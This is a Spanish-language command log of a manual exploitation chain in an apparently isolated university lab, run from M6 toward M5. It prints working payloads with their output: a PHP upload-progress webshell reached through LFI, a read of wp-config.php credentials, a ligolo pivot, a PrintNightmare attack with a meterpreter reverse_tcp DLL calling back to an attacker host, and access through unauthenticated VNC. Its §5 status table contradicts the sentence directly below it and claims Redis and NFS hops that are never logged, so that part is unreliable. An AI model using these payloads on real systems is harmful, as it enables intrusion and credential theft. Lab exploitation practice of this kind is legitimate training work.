# Bitácora de comandos · explotación manual M6 → M5

> Registro de lo ejecutado el **2026-11-02** (UTC), siguiendo
> `lab/GUIA-EXPLOTACION.md` comando por comando.
> Regla: si un paso falla, se detiene la cadena y se anota aquí.
> **No se declara RCE sin `id` real.**

---

## 1. Gate de arranque (§0.1)

**Hora UTC:** 2026-11-02T05:21:19Z

```bash
for h in 11 12 13 14 15; do
  ping -c1 -W1 "10.10.10.$h" >/dev/null 2>&1 \
    && echo "10.10.10.$h UP" \
    || echo "10.10.10.$h DOWN"
done
```

Salida:

```
10.10.10.11 UP
10.10.10.12 UP
10.10.10.13 UP
10.10.10.14 UP
10.10.10.15 UP
```

Resultado: **PASS** (las 5 VM responden).

```bash
curl -fsSI http://10.10.10.20:8000/lab.tar.gz >/dev/null && echo "repo :8000 OK"
```

Salida:

```
curl: (7) Failed to connect to 10.10.10.20:8000 after 1 ms: Could not connect to server
```

Resultado: **FAIL**. `systemctl is-active lab-web` → `inactive`; nada escucha en `:8000`.
Causa: `lab/m6/install.sh` no se ha ejecutado (`/srv/lab` no existe) y `sudo` pide
contraseña en esta sesión.

```bash
getent hosts wp.uni.lab
```

Salida:

```
10.10.10.11     app.uni.lab wp.uni.lab
```

Resultado: **PASS** (resuelve, aunque M4 no fue el que respondió al DNS en este caso).

```bash
for c in nmap redis-cli ssh smbclient msfconsole vncviewer ligolo-proxy; do
  command -v "$c" >/dev/null 2>&1 && echo "$c OK" || echo "$c FALTA"
done
```

Salida:

```
nmap OK
redis-cli OK
ssh OK
smbclient OK
msfconsole OK
vncviewer OK
ligolo-proxy FALTA
```

Resultado: **FAIL parcial**. Falta `ligolo-proxy` (§1.1).

**Decisión:** el gate no está completo (`:8000` y `ligolo-proxy`), pero M1 está
instalada, así que se comprueba el §2.1 antes de detenerse.

---

## 2. Salto 1 · §2.1 Comprobación previa

```bash
curl -k -s -o /dev/null -w '%{http_code}\n' https://wp.uni.lab/
curl -k -s -o /dev/null -w '%{http_code}\n' https://wp.uni.lab/lab/session.php
curl -k -s 'https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php?file=default.php'
```

Salida:

```
200
200
<!doctype html>
<html lang="es">
<head><meta charset="utf-8"><title>Plantilla heredada</title></head>
<body>
<h1>Plantilla base</h1>
```

Resultado: **PASS**. M1 sirve WordPress, el harness y el sink LFI.

---

## 3. Salto 1 · §2.2 Explotación manual — **FALLA**

### Intento 1

```bash
SID="lab$(date +%s)"
head -c 8388608 /dev/zero > /tmp/u.bin
curl -sk --max-time 180 --limit-rate 128k -b "PHPSESSID=$SID" \
  -F 'PHP_SESSION_UPLOAD_PROGRESS=<?php echo "PWN"; system($_GET["c"]); ?>' \
  -F 'payload=@/tmp/u.bin;filename=payload.bin' \
  https://wp.uni.lab/lab/session.php -o /dev/null &
PID=$!
sleep 4
kill "$PID" 2>/dev/null || true
wait "$PID" 2>/dev/null || true
curl -sk -G 'https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php' \
  --data-urlencode "file=../../../../../../../tmp/sess_$SID" \
  --data-urlencode 'c=id'
```

Salida:

```
SID=lab1793596904
--- LFI ---
plantilla no encontrada
```

Resultado: **FAIL**. No se obtuvo `uid=`.

### Intento 2 (SID nuevo)

Salida:

```
SID=lab1793596950
--- comprobar si existe el archivo de sesión (mismo sink) ---
plantilla no encontrada
--- LFI con payload ---
plantilla no encontrada
```

Resultado: **FAIL**. El archivo `/tmp/sess_<SID>` no existe.

---

## 4. Diagnóstico del fallo (sin continuar la cadena)

### 4.1 El harness adopta el SID y el archivo de sesión se crea

```bash
curl -k -s -b 'PHPSESSID=labTEST123' 'https://wp.uni.lab/lab/session.php'
curl -k -s 'https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php?file=../../../../../../../tmp/sess_labTEST123'
```

Salida:

```
sid=labTEST123 n=2
n|i:2;
```

Resultado: **PASS**. PHP acepta el SID del cliente (`use_strict_mode=0`) y el sink
lee `/tmp/sess_*`. La profundidad de 7 niveles es correcta.

### 4.2 Control de ruta con `/etc/passwd`

```bash
curl -k -s 'https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php?file=../../../../../../../etc/passwd'
```

Salida:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

Resultado: **PASS**. El sink sale de `templates/` hasta `/`.

### 4.3 Configuración PHP efectiva

```bash
curl -k -s 'https://wp.uni.lab/lab/session.php?info=1'
```

Salida:

```
session.save_path=/tmp
session.upload_progress.enabled=1
session.upload_progress.cleanup=
session.upload_progress.name=PHP_SESSION_UPLOAD_PROGRESS
memory_limit=256M
post_max_size=64M
open_basedir=
```

Resultado: **PASS**. `cleanup=` vacío = `Off`; `enabled=1`; `save_path=/tmp`.

### 4.4 Causa raíz: `curl -F` interpreta `;` como atributo

Prueba aislada contra un servidor local:

```bash
curl -s -o /dev/null -w 'http=%{http_code} up=%{size_upload}\n' \
  -F 'PHP_SESSION_UPLOAD_PROGRESS=<?php echo "PWN"; system($_GET["c"]); ?>' \
  -F 'payload=@/tmp/u1.bin;filename=payload.bin' \
  http://127.0.0.1:9099/
```

Salida:

```
http=000 up=0
rc=26
```

`rc=26` = error leyendo el archivo local. **No es la red ni M1**: el `;` dentro
del valor de `-F` hace que curl lo interprete como separador de atributos de
formulario y aborta antes de enviar nada. Por eso el archivo de sesión nunca se
crea y el LFI responde `plantilla no encontrada`.

Prueba del mismo valor con `--form-string` (valor literal):

```bash
curl -s -o /dev/null -w 'http=%{http_code} up=%{size_upload}\n' \
  --form-string 'PHP_SESSION_UPLOAD_PROGRESS=<?php echo "PWN"; system($_GET["c"]); ?>' \
  -F 'payload=@/tmp/u1.bin;filename=payload.bin' \
  http://127.0.0.1:9099/
```

Salida:

```
http=501 up=0
rc=0
```

`501` es del servidor de prueba (no acepta POST), pero **curl ya envía el
formulario** (`rc=0`). El problema es el parseo de `-F`, no el payload.

**Alcance:** afecta a `lab/GUIA-EXPLOTACION.md` §2.2 y a
`lab/chain/01-m1-php2shell.sh` (usa el mismo `-F` con `;` en el payload).

---

## 5. Estado de la cadena

| Paso | Estado |
|---|---|
| §0.1 Gate | **PASS** tras levantar `:8000` e instalar `ligolo-proxy` |
| §2.1–2.2 | **PASS** (`uid=33(www-data)`, `m1-app`) |
| Salto 1.5 pivote | **PASS** (`Agent joined`, rutas por `dev lab`) |
| Salto 2 Redis | **PASS** (`uid=0(root)` en `m2-db`) |
| Salto 3 NFS+cron | **PASS** (`uid=0(root)` en `m3-bkp` + `PWNED-M3.txt`) |
| Salto 4 PrintNightmare (opcional) | **SYSTEM logrado una vez** (`NT AUTHORITY\SYSTEM @ SRVOLD`), pero el módulo crashea el spooler y no se capturó `getuid`/marcador; evidencia incompleta |
| Salto 5 VNC | **PASS**: `Authentication: None` + escritorio VNC + `FLAG-M5-cliente` (EV-05-01 / LOG-05-01) |
| Cadena operativa | **M1 → M2 → M3 → M5**; M4 es opcional y usa `soporte` como precondición |

**No hay RCE declarado**: no se obtuvo `id`, no hay `WS_SID` válido y no se tocó
Redis, NFS, SMB ni VNC.

---

## 6. Corrección mínima aplicada

Se cambió el campo de progreso de `-F` a `--form-string` en
`lab/GUIA-EXPLOTACION.md` §2.2 y en `lab/chain/01-m1-php2shell.sh` (comando y
bloque impreso). No se cambió nada más del payload ni del flujo.

## 7. Reintento del §2.2 con la corrección — **PASS**

**Hora UTC:** 2026-11-02 (sesión de la mañana)

```bash
SID="lab$(date +%s)"
head -c 8388608 /dev/zero > /tmp/u.bin
curl -sk --max-time 180 --limit-rate 128k -b "PHPSESSID=$SID" \
  --form-string 'PHP_SESSION_UPLOAD_PROGRESS=<?php echo "PWN"; system($_GET["c"]); ?>' \
  -F 'payload=@/tmp/u.bin;filename=payload.bin' \
  https://wp.uni.lab/lab/session.php -o /dev/null &
PID=$!
sleep 4
kill "$PID" 2>/dev/null || true
wait "$PID" 2>/dev/null || true
curl -sk -G 'https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php' \
  --data-urlencode "file=../../../../../../../tmp/sess_$SID" \
  --data-urlencode 'c=id'
```

Salida (recortada):

```
SID=lab1793597081
--- archivo de sesión ---
upload_progress_PWN
--- LFI con payload ---
upload_progress_PWNuid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Resultado: **PASS**. RCE como `www-data` confirmado por el sink LFI.

### Estado guardado

```bash
printf 'WS_SID=%s\nLFI_URL=%s\n' 'lab1793597081' \
  'https://wp.uni.lab/wp-content/plugins/legacy-download/dl.php' \
  > /tmp/lab-chain.env
chmod 600 /tmp/lab-chain.env
```

`WS_SID=lab1793597081` guardado en `/tmp/lab-chain.env`.

### Verificación del canal

```bash
. /tmp/lab-chain.env
m1() {
  curl -sk -G "$LFI_URL" \
    --data-urlencode "file=../../../../../../../tmp/sess_$WS_SID" \
    --data-urlencode "c=$1"
}
m1 'id; hostname'
```

Salida:

```
upload_progress_PWNuid=33(www-data) gid=33(www-data) groups=33(www-data)
m1-app
```

```bash
m1 'grep -E "DB_NAME|DB_USER|DB_PASSWORD|table_prefix" /var/www/wp/wp-config.php | head -5'
```

Salida:

```
define( 'DB_NAME', 'wp_db' );
define( 'DB_USER', 'wp_user' );
define( 'DB_PASSWORD', 'ClaveDebil123' );
$table_prefix = 'wp_';
```

**Salto 1 cerrado:** `www-data` en `m1-app` y lectura de `wp-config.php` por el
mismo canal.

---

## 8. Salto 1.5 · preparación del pivote — **BLOQUEADO**

### 8.1 Segundo problema: la MAC salía contaminada

El comando de la guía extraía la MAC de la salida del sink, pero esa salida
incluye el prefijo `upload_progress_PWN` y la cola serializada:

```
upload_progress_PWN00:0c:29:37:f7:b6
|a:5:{s:10:"start_time";...}
```

Con `tr -d ':\r\n'` el id quedaba como
`upload_progress_pwn000c2937f7b6|a5{...}`. Se corrigió la extracción con
`grep -oE` en la guía:

```bash
MAC="$(m1 'cat /sys/class/net/*/address 2>/dev/null | head -1' \
  | grep -oE '([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}' | head -1 \
  | tr -d ':' | tr 'A-Z' 'a-z')"
echo "id del agente: $MAC"
```

Salida:

```
id del agente: 000c2937f7b6
```

### 8.2 `ligolo.yaml` escrito

```bash
mkdir -p ~/lab-work
cat > ~/lab-work/ligolo.yaml <<EOF
agent:
    "$MAC":
        autobind: true
        interface: lab
interface:
    lab:
        routes:
            - 10.10.10.12/32
            - 10.10.10.13/32
            - 10.10.10.14/32
            - 10.10.10.15/32
web:
    enabled: false
EOF
cat ~/lab-work/ligolo.yaml
```

Salida:

```
agent:
    "000c2937f7b6":
        autobind: true
        interface: lab
interface:
    lab:
        routes:
            - 10.10.10.12/32
            - 10.10.10.13/32
            - 10.10.10.14/32
            - 10.10.10.15/32
web:
    enabled: false
```

Resultado: **PASS** (preparación).

### 8.3 Bloqueo: `sudo` pide contraseña

```bash
tar xzf artifacts/pocs/ligolo-ng_proxy_0.9.2_linux_amd64.tar.gz -C /tmp
sudo install -m 755 /tmp/proxy /usr/local/bin/ligolo-proxy
```

Salida:

```
-rwxr-xr-x 1 kali kali 21242040 Sep 26 04:07 /tmp/proxy
sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
sudo: a password is required
```

Lo mismo ocurre con `sudo bash lab/m6/install.sh` (`:8000`). Sin root no se
puede instalar `ligolo-proxy`, ni crear la interfaz TUN `lab`, ni añadir rutas.

Resultado: **FAIL**. Cadena detenida antes del túnel.

---

## 9. Reanudación: servidor y ligolo listos

Tras ejecutar el usuario `sudo bash lab/m6/install.sh` y
`sudo install -m 755 /tmp/proxy /usr/local/bin/ligolo-proxy`:

```bash
command -v ligolo-proxy && ligolo-proxy -h | head -2
```

Salida:

```
/usr/local/bin/ligolo-proxy
Ligolo-ng 0.9.2 / e543732f4be6dc899096ae322ae620bf010bfbfc / 2026-09-26T08:03:03Z
```

```bash
ls -ld /srv/lab /srv/lab.tar.gz
```

Salida:

```
drwxrwxr-x 5 kali kali      4096 Nov  1 21:13 /srv/lab
-rw-r--r-- 1 root root 173504946 Nov  2 00:29 /srv/lab.tar.gz
```

El servidor no estaba corriendo; se levantó con el comando de la guía:

```bash
bash lab/m6/serve.sh
```

Verificación:

```bash
curl -fsSI http://10.10.10.20:8000/lab.tar.gz
curl -fsSI http://10.10.10.20:8000/artifacts/pocs/ligolo-ng_agent_0.9.2_linux_amd64.tar.gz
```

Salida:

```
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.14.8
HTTP/1.0 200 OK
Server: SimpleHTTP/0.6 Python/3.14.8
```

Gate completo:

```
10.10.10.11 UP
10.10.10.12 UP
10.10.10.13 UP
10.10.10.14 UP
10.10.10.15 UP
repo :8000 OK
10.10.10.11     app.uni.lab wp.uni.lab
nmap OK
redis-cli OK
ssh OK
smbclient OK
msfconsole OK
vncviewer OK
ligolo-proxy OK
```

Resultado: **PASS**. Único bloqueo restante: el proxy ligolo necesita root
(interfaz TUN y rutas). `sudo -n true` sigue devolviendo
`sudo: a password is required`.

---

## 10. Salto 4 · PrintNightmare — **FALLA en autenticación**

### 10.1 Comprobación

```bash
ip route get 10.10.10.14 | grep -q 'dev lab' && echo "pivote OK"
nmap -Pn -p445,135,139 10.10.10.14
ls -l /usr/share/metasploit-framework/modules/exploits/windows/dcerpc/cve_2021_1675_printnightmare.rb
```

Salida:

```
pivote OK
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
-rw-r--r-- 1 root root 12458 ... cve_2021_1675_printnightmare.rb
```

### 10.2 DLL y módulo

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.20 LPORT=4444 \
  -f dll -o ~/lab-work/pn.dll
```

Salida:

```
Payload size: 509 bytes
Final size of dll file: 9216 bytes
Saved as: /home/kali/lab-work/pn.dll
```

El módulo **no tiene opción `DLL`** (la genera él); `set DLL` y
`set ExitOnSession` salen como "Unknown datastore option" pero no impiden seguir.

### 10.3 Ejecución

```bash
msfconsole -q -r ~/lab-work/pn.rc
```

Salida relevante:

```
[*] Started reverse TCP handler on 10.10.10.20:4444
[*] 10.10.10.14:445 - Running automatic check ("set AutoCheck false" to disable)
[-] 10.10.10.14:445 - Exploit aborted due to failure: unknown:
    Cannot reliably check exploitability. Failed to authenticate to the remote service.
[*] Exploit completed, but no session was created.
No active sessions.
```

Resultado: **FAIL**. No hay sesión meterpreter ni `getuid`.

### 10.4 Diagnóstico de la cuenta `soporte`

```bash
smbclient -L //10.10.10.14 -U 'soporte%Soporte2026!' -m SMB3
nxc smb 10.10.10.14 -u 'soporte' -p 'Soporte2026!'
nxc winrm 10.10.10.14 -u 'soporte' -p 'Soporte2026!'
```

Salida:

```
session setup failed: NT_STATUS_LOGON_FAILURE
[-] srvold\soporte:Soporte2026! STATUS_LOGON_FAILURE
[-] srvold\soporte:Soporte2026!
```

La cuenta existe, está activa y no está bloqueada; el umbral de bloqueo es
"Nunca". Con `Administrador` (credencial de administración del README, **no de
la cadena**) se consultó el estado y se leyó el log del instalador.

Hallazgos:

- `soporte` está en el grupo `Usuarios`, sin admin.
- `Password required: No`; hash SAM distinto del MD4 de `Soporte2026!`.
- El log `C:\lab\logs\m4-install.log` muestra el paso `5/10 cuentas locales`
  pero **sin línea** de "usuario creado" ni "clave de soporte actualizada";
  solo aparece "clave de Administrador actualizada".
- El intento de fijar `Soporte2026!` con `Set-LocalUser` es rechazado por
  "no cumple los requisitos de longitud, complejidad o historial". La política
  local tiene complejidad activada y el password **contiene el nombre de la
  cuenta** (`Soporte`), lo que Windows rechaza.

Conclusión de esa fase: la contraseña documentada no se pudo aplicar en M4; la
cuenta quedó con una clave desconocida y el salto 4 no podía autenticarse.

### 10.5 La clave se corrigió: `UniLab2026!` autentica

```bash
smbclient -L //10.10.10.14 -U 'soporte%UniLab2026!' -m SMB3
nxc smb 10.10.10.14 -u 'soporte' -p 'UniLab2026!'
```

Salida:

```
Sharename       Type      Comment
ADMIN$          Disk      Admin remota
...
[+] srvold\soporte:UniLab2026!
```

Resultado: **PASS** de autenticación con `soporte` / `UniLab2026!`.
La copia local del repo se alineó a esa clave (instalador, cadena, guía, README
y MEMORY).

### 10.6 Reintento de PrintNightmare: ahora falla en RPC

```bash
msfconsole -q -r ~/lab-work/pn.rc
```

Salida:

```
[*] Target environment: Windows v10.0.14393 (x64)
[*] Enumerating the installed printer drivers...
[-] Exploit failed: EOFError End of file reached
[*] Exploit completed, but no session was created.
```

Se repitió con `Administrador`, con `SMB::ProtocolVersion 1`, `2` y con
`SMB::AlwaysEncrypt false` / `ChunkSize 65535`: **mismo `EOFError`**. No es
permisos de `soporte` ni la versión de SMB.

### 10.7 El objetivo está parcheado

```bash
nxc smb 10.10.10.14 -u 'soporte' -p 'UniLab2026!' -M printnightmare --verbose
nxc smb 10.10.10.14 -u 'Administrador' -p 'M4_Admin_2026!' -M printnightmare --verbose
```

Salida (ambas cuentas):

```
INFO  Binding to 'ncacn_np:10.10.10.14[\\PIPE\\spoolss]'
INFO  Not vulnerable :'(
```

```bash
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
  /v RestrictDriverInstallationToAdministrators
```

Salida:

```
ERROR: El sistema no ha podido encontrar la clave o el valor del Registro
especificados.
```

Hotfixes recientes (leídos con la cuenta de administración):

```
KB5012170   02/11/2026
KB5062799   02/11/2026
KB5062560   02/11/2026
KB4589210   02/11/2026
```

`KB5062799`/`KB5062560` son acumulativos de 2026 para Server 2016: incluyen el
parche de PrintNightmare. La mitigación deja la instalación de drivers
restringida a administradores, y por eso el `check` da **Not vulnerable** tanto
con `soporte` como con `Administrador`.

**Causa operativa probable:** M4 tuvo salida a Internet y Windows Update aplicó
los acumulativos el 2026-11-02, violando la regla de aislamiento del laboratorio.

Resultado: **FAIL**. No hay SYSTEM en M4 y el salto 5 no se ejecutó. El fallo ya
no es de credenciales: el objetivo perdió la vulnerabilidad que el escenario
necesita.

### 10.8 Reversión de M4: bloqueada por el hipervisor

```bash
command -v vmrun govc virsh VBoxManage
```

Salida: ninguno instalado en M6. Los snapshots (`00-base`, `estado-inicial`) se
gestionan en el hipervisor, fuera de la VM.

```bash
Get-WindowsPackage -Online | Where PackageName -match '5062799|5062560'
```

Salida:

```
Package_for_KB5062799  PackageState: Installed  ReleaseType: SecurityUpdate
Package_for_KB5012170  PackageState: Installed  ReleaseType: SecurityUpdate
```

El acumulativo es desinstalable en teoría (`wusa /uninstall`), pero exige
reinicio y, sin snapshot accesible, no hay red de seguridad si el arranque
queda inconsistente. **Acción requerida:** revertir el snapshot de M4 en el
hipervisor a un estado anterior al 2026-11-02 y dejarlo sin Internet.

### 10.9 Tras revertir M4: vulnerable, pero sin camino de vuelta

La reversión funcionó y la comprobación cambió:

```bash
nxc smb 10.10.10.14 -u soporte -p 'UniLab2026!' -M printnightmare --verbose
```

Salida:

```
[+] srvold\soporte:UniLab2026!
[*] Binding to 'ncacn_np:10.10.10.14[\\PIPE\\spoolss]'
Vulnerable, next step https://github.com/ly4k/PrintNightmare
```

Metasploit ya pasa el `check` y arranca su servidor SMB:

```
[+] The target is vulnerable. Received ERROR_BAD_NET_NAME
[*] Server is running. Listening on 10.10.10.20:445
[*] Server started.
[*] Exploit completed, but no session was created.
```

La causa es de topología: **M4 no puede alcanzar M6**. Comprobado desde M4:

```
10.10.10.11 ping=True
10.10.10.12 ping=True
10.10.10.13 ping=True
10.10.10.15 ping=True
10.10.10.20 ping=False
```

Y los puertos del servidor del módulo tampoco:

```
Test-NetConnection 10.10.10.20 -Port 8000  -> False
Test-NetConnection 10.10.10.20 -Port 445   -> False
```

El pivote ligolo es **unidireccional** (M6 → M2–M5). PrintNightmare es una
vulnerabilidad de **descarga inversa**: el spooler de M4 debe conectarse al
servidor SMB del atacante para traer la DLL. La guía no contempla ese camino de
vuelta, y el túnel no lo proporciona.

Se intentó habilitar `ip_forward` en M1 y reglas `FORWARD` explícitas con la
cuenta de administración; M4 siguió sin alcanzar `.20`. Los cambios se
revirtieron (`ip_forward=0`, política `FORWARD DROP`, reglas eliminadas).

También se probó una variante con la DLL en `C:\Transfer` (ruta local) y un RPC
con impacket, pero se detuvo para no desviarse de la guía.

**Conclusión:** el §6 de la guía no es ejecutable en esta topología. Para
seguirla tal cual, el hipervisor debe permitir `M4 → 10.10.10.20:445/4444`
(misma VMnet o ruta/NAT). Alternativa: corregir la guía para servir la DLL
desde un host alcanzable por M4 y usar un payload sin callback.

### 10.10 Causa real: la ruta `/32` de `.14`

No era firewall ni VMnet. `rp_filter=2` (loose), `nft` vacío e `iptables` en
`ACCEPT`. El problema era la ruta que monta el pivote:

```
10.10.10.14 dev lab
```

M6 recibía el `echo request` por `eth1`, pero respondía por el túnel. Como M4 y
M6 comparten L2, esa `/32` sobra. Al eliminarla:

```bash
sudo ip route del 10.10.10.14/32 dev lab
ip route get 10.10.10.14
```

Salida:

```
10.10.10.14 dev eth1 src 10.10.10.20 uid 1000
```

Y desde M4:

```
ping=True tcp8000=True
```

Resultado: **PASS**. El pivote debe excluir a M4 (y probablemente a M5) porque
están en el mismo segmento; la `/32` rompe el callback de PrintNightmare.

### 10.11 §6 ejecutado: SYSTEM confirmado, evidencia incompleta

Con la ruta directa, el módulo completó el ataque:

```
[+] The target is vulnerable. Received ERROR_BAD_NET_NAME
[*] Server is running. Listening on 10.10.10.20:445
[*] Sending stage (255675 bytes) to 10.10.10.14
[*] Meterpreter session 1 opened (10.10.10.20:4444 -> 10.10.10.14:49700)
```

```
Active sessions
  Id  Name  Type                     Information
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ SRVOLD
```

Resultado: **SYSTEM confirmado por la tabla de sesiones**.

Problema: el módulo es inestable (`Stability: CRASH_SERVICE_DOWN`). Tras el
primer éxito:

- el spooler quedó `STOPPED`;
- se acumularon drivers aleatorios (`TM 89`, `OARV 821`, `IP 708`, `FMAS 01`,
  `OADK 813`, `BBZ 057`);
- los intentos siguientes fallan con `STATUS_PIPE_CLOSING`;
- no se pudo ejecutar `getuid` ni escribir `C:\Transfer\PWNED-M4.txt` dentro de
  la sesión antes de que el spooler cayera.

Se limpiaron los drivers, se reinició M4 (sin Internet, `wuauserv` detenido) y
se reintentó con payload `exec`; el spooler volvió a caer. **Falta el marcador
y el `getuid` capturado en sesión**, que la guía exige como evidencia.

Estado: el salto 4 está **técnicamente logrado** (sesión SYSTEM), pero la
evidencia del §6 está incompleta. Para cerrarlo limpiamente hace falta revertir
M4 otra vez y ejecutar **un solo** intento con payload `exec` (sin callback),
leyendo el marcador por SMB.

---

## 11. Salto 5 · M5 · VNC sin autenticación — **PASS**

### 11.1 Comprobación (§7.1)

```bash
nmap -Pn -p5900 --script vnc-info 10.10.10.15
```

Salida:

```
PORT     STATE SERVICE
5900/tcp open  vnc
| vnc-info:
|   Protocol version: 3.8
|   Security types:
|     None (1)
|     Tight (16)
|   Tight auth subtypes:
|     None
|_  WARNING: Server does not require authentication
```

Resultado: **PASS**. `Authentication: None`.

### 11.2 Acceso y captura (§7.2/§7.3)

Sin display físico se usó Xvfb + TigerVNC:

```bash
Xvfb :99 -screen 0 1280x800x24 &
DISPLAY=:99 vncviewer 10.10.10.15 &
sleep 7
DISPLAY=:99 import -window root evidence/EV-05-01.png
```

La captura muestra el escritorio de M5: iconos `flag-M5`, `PWNED-M5`,
`LEEME-COM...` y Microsoft Edge.

### 11.3 Bandera

```bash
smbclient //10.10.10.15/Compartido -N -c 'get flag-M5.txt'
```

Salida:

```
session setup failed: NT_STATUS_ACCESS_DENIED
```

El SMB anónimo está denegado en este snapshot. Se recuperó con la cuenta de
laboratorio de M5 (canal independiente del VNC):

```bash
smbclient //10.10.10.15/Compartido -U 'cliente%Admin13.-' \
  -c 'get flag-M5.txt'
cat flag-M5.txt
```

Contenido:

```
FLAG-M5-cliente

Nota: marcador del laboratorio aislado uni.lab (M5 / pc-est01).
Obtenido por la cadena M4 -> M5 (SMB/RDP). No es un dato real.
Plantilla del marcador: FLAG-M5-{cliente}
```

Evidencias:

- `evidence/EV-05-01.png` — escritorio VNC de M5.
- `evidence/LOG-05-01.txt` — `vnc-info` + bandera.
- `evidence/SHA256SUMS-05.txt` — hashes.

Resultado: **PASS**. VNC sin autenticación da escritorio (no shell); la
evidencia es `Authentication: None` + captura + bandera por SMB.

---

## 12. Reclasificación de M4 (opcional)

La cadena operativa es **M1 → M2 → M3 → M5**. M4 no es requisito:

- M5 expone `5900` sin autenticación y es alcanzable desde M6 (mapeo §0.3).
- M4 usa `soporte` / `UniLab2026!` como **precondición** de PrintNightmare; no
  es una credencial obtenida por explotación.
- Por eso M4 pasa a **salto opcional**: su evidencia (sesión SYSTEM sin
  marcador) se conserva, pero no condiciona el cierre de la cadena.

Cambios de documentación: `README.md`, `lab/README.md`, `lab/GUIA-EXPLOTACION.md`
(§0.3, §3, §6, §7, §9, §11), `lab/GUION-SUSTENTACION.md`, `MEMORY.md` y
`lab/chain/01b-pivot.sh` (solo enruta M2/M3; M4/M5 van directos).
